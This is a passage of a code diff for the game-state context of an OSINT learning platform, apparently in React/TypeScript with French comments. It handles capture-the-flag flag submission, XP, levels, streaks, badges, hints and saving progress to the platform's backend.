+        c.id === challengeId ? { ...c, attempts: c.attempts + 1 } : c
+      ));
+      return { success: false, message: `❌ Flag incorrect. Tentative ${challenge.attempts + 1}.` };
     }
 
-    showNotification(`⭐ +${amount} XP : ${reason}`, "success");
+    // Flag correct !
+    const today = new Date().toISOString().split("T")[0];
+    const updatedChallenges = challenges.map(c =>
+      c.id === challengeId ? { ...c, solved: true, solvedAt: new Date().toISOString() } : c
+    );
+    setChallenges(updatedChallenges);
+
+    setGameState(prev => {
+      const newXP = prev.xp + challenge.points;
+      const { level, levelName } = computeLevel(newXP);
+
+      // Mise à jour calendrier
+      const newCalendar = { ...prev.activityCalendar };
+      newCalendar[today] = (newCalendar[today] || 0) + 1;
+
+      // Streak
+      const lastDate = prev.lastActivity;
+      const yesterday = new Date(Date.now() - 86400000).toISOString().split("T")[0];
+      let newStreak = prev.streak;
+      if (lastDate === yesterday || lastDate === today) {
+        newStreak = lastDate === today ? prev.streak : prev.streak + 1;
+      } else {
+        newStreak = 1;
+      }
+
+      const newSolved = [...prev.solvedChallenges, challengeId];
+      const tempState = {
+        ...prev, xp: newXP, level, levelName,
+        solvedChallenges: newSolved,
+        lastActivity: today,
+        activityCalendar: newCalendar,
+        streak: newStreak,
+        longestStreak: Math.max(prev.longestStreak, newStreak),
+      };
+
+      const { newBadges, xpBonus } = checkBadges(tempState, updatedChallenges);
+      const finalXP = newXP + xpBonus;
+      const { level: finalLevel, levelName: finalLevelName } = computeLevel(finalXP);
+
+      return { ...tempState, xp: finalXP, level: finalLevel, levelName: finalLevelName, badges: newBadges };
+    });
+
+    showNotification(`✅ FLAG validé ! +${challenge.points} XP`, "success");
+    
+    // 🔥 SAUVEGARDER DANS L'API
+    if (user && token) {
+      const newSolved = [...gameState.solvedChallenges, challengeId];
+      fetch("https://osint-lms-backend.onrender.com/game/save", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${token}`
+        },
+        body: JSON.stringify({
+          xp: gameState.xp + challenge.points,
+          level: gameState.level,
+          streak: gameState.streak,
+          solvedChallenges: newSolved,
+          badges: gameState.badges.filter(b => b.unlocked).map(b => ({ id: b.id, unlockedAt: b.unlockedAt }))
+        })
+      }).catch(err => console.error("Erreur sauvegarde API:", err));
+    }
+    
+    return { success: true, message: `✅ Correct ! +${challenge.points} XP`, xpGained: challenge.points };
+  };
+
+  const useHint = (challengeId: string) => {
+    setChallenges(prev => prev.map(c =>
+      c.id === challengeId ? { ...c, hintUsed: true } as CTFChallenge : c
+    ));
   };
 
   const checkAndUpdateStreak = () => {
     const today = new Date().toISOString().split("T")[0];
-    const lastActivity = gameState.lastActivity;
-
-    if (!lastActivity) {
-      const newState = {
-        ...gameState,
-        streak: 1,
-        longestStreak: Math.max(1, gameState.longestStreak),
+    setGameState(prev => {
+      if (prev.lastActivity === today) return prev;
+      const yesterday = new Date(Date.now() - 86400000).toISOString().split("T")[0];
+      const newStreak = prev.lastActivity === yesterday ? prev.streak + 1 : 1;
+      return {
+        ...prev, streak: newStreak,
+        longestStreak: Math.max(prev.longestStreak, newStreak),
         lastActivity: today,
-        activityCalendar: { ...gameState.activityCalendar, [today]: 1 }
       };
-      setGameState(newState);
-      saveToAPI(newState);
-      return;
-    }
-
-    const lastDate = new Date(lastActivity);
-    const todayDate = new Date(today);
-    const diffDays = Math.floor((todayDate.getTime() - lastDate.getTime()) / (1000 * 60 * 60 * 24));
-
-    if (diffDays === 0) {
-      return;
-    } else if (diffDays === 1) {
-      const newStreak = gameState.streak + 1;
-      const newState = {
-        ...gameState,
-        streak: newStreak,
-        longestStreak: Math.max(newStreak, gameState.longestStreak),
-        lastActivity: today,
-        activityCalendar: { ...gameState.activityCalendar, [today]: 1 }
-      };
-      setGameState(newState);
-      saveToAPI(newState);
-    } else {
-      const newState = {
-        ...gameState,
-        streak: 1,
-        lastActivity: today,
-        activityCalendar: { ...gameState.activityCalendar, [today]: 1 }
-      };
-      setGameState(newState);
-      saveToAPI(newState);
-    }
+    });
   };
 
   return (
-    <GameContext.Provider
-      value={{
-        gameState,
-        challenges,
-        submitFlag,
-        useHint,
-        addXP,
-        checkAndUpdateStreak,
-        recentNotification,
-        clearNotification
-      }}
-    >
+    <GameContext.Provider value={{
+      gameState, challenges, submitFlag, useHint,
+      addXP, checkAndUpdateStreak, recentNotification, clearNotification
+    }}>
       {children}
     </GameContext.Provider>
   );
 }
 
 export function useGame() {
-  const context = useContext(GameContext);
-  if (!context) {
-    throw new Error("useGame must be used within GameProvider");
-  }
-  return context;
+  const ctx = useContext(GameContext);
+  if (!ctx) throw new Error("useGame doit être dans un GameProvider");
+  return ctx;
 }
